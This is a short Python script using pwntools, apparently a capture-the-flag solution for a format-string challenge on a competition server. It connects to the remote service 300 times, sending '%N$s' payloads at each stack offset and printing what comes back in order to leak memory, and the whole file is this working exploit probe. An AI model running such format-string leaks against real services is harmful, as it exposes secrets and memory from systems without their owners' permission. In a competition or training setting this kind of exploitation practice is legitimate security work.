from pwn import *

#elf = context.binary = ELF('./formatting', checksec=False)

for i in range(300):
    try:
        p = remote('challenges.open.ecsc.no', 38080, level='warn')
        p.sendline('%{}$s'.format(i))
        p.recvline()

        result = p.recvline()

        print(str(i) + ':' + str(result))

        p.close()
    except EOFError:
        pass

